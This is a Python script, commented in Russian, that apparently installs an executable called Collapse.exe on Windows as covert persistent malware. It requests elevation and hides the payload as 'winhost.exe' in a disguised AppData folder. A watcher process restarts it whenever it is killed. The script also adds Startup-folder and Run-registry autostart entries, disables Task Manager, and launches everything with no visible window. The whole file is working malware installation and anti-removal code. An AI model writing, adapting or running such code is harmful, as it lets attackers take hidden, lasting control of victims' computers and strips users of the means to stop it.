import os, sys, shutil, subprocess, ctypes, winreg

COLLAPSE_EXE = "Collapse.exe"   # должен лежать рядом
INSTALL_DIR = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Caches')
INSTALL_PATH = os.path.join(INSTALL_DIR, 'winhost.exe')
WATCHER_PATH = os.path.join(INSTALL_DIR, 'watcher.exe')

def is_admin():
    try: return ctypes.windll.shell32.IsUserAnAdmin()
    except: return False

def run_as_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{__file__}"', None, 1)
    sys.exit()

if not is_admin():
    run_as_admin()

# 1. Создаём скрытую папку
os.makedirs(INSTALL_DIR, exist_ok=True)
ctypes.windll.kernel32.SetFileAttributesW(INSTALL_DIR, 2)

# 2. Копируем Collapse.exe
shutil.copy2(COLLAPSE_EXE, INSTALL_PATH)

# 3. Создаём сторожа (watcher.exe) – следит за процессом и перезапускает при убийстве
watcher_code = f'''\
import subprocess, time, os, sys
exe = r"{INSTALL_PATH}"
while True:
    out = subprocess.run(f'tasklist /fi "imagename eq winhost.exe"', shell=True, capture_output=True, text=True).stdout
    if "winhost.exe" not in out:
        CREATE_NO_WINDOW = 0x08000000
        subprocess.Popen(exe, creationflags=CREATE_NO_WINDOW, shell=True)
    time.sleep(3)
'''
with open(os.path.join(INSTALL_DIR, 'watcher.py'), 'w') as f:
    f.write(watcher_code)
# Компилируем watcher в exe (если pyinstaller доступен, иначе оставляем py и запускаем через pythonw)
if shutil.which('pyinstaller'):
    subprocess.run(['pyinstaller', '--onefile', '--noconsole', '--distpath', INSTALL_DIR,
                    '--workpath', os.path.join(INSTALL_DIR, 'build'), '--specpath', INSTALL_DIR,
                    os.path.join(INSTALL_DIR, 'watcher.py')], capture_output=True)
    os.replace(os.path.join(INSTALL_DIR, 'watcher.exe'), WATCHER_PATH)
else:
    # Если нет pyinstaller, используем pythonw.exe для скрытого запуска
    WATCHER_PATH = f'pythonw.exe "{os.path.join(INSTALL_DIR, "watcher.py")}"'

# 4. Добавляем в папку автозагрузки (Startup) ярлык на winhost.exe
startup = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
ps_cmd = f'''
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut("{os.path.join(startup, 'WindowsHost.lnk')}")
$Shortcut.TargetPath = "{INSTALL_PATH}"
$Shortcut.Save()
'''
subprocess.run(['powershell', '-Command', ps_cmd], capture_output=True)

# 5. Добавляем в реестр (HKCU Run) – две записи: winhost и watcher
with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as key:
    winreg.SetValueEx(key, "WindowsHost", 0, winreg.REG_SZ, INSTALL_PATH)
    winreg.SetValueEx(key, "WindowsWatcher", 0, winreg.REG_SZ, WATCHER_PATH)

# 6. Отключаем Диспетчер задач через реестр
with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE) as key:
    winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)

# 7. Запускаем winhost.exe скрыто
CREATE_NO_WINDOW = 0x08000000
subprocess.Popen(INSTALL_PATH, creationflags=CREATE_NO_WINDOW, shell=True)
# Запускаем сторожа
subprocess.Popen(WATCHER_PATH, creationflags=CREATE_NO_WINDOW, shell=True)

# Скрипт завершается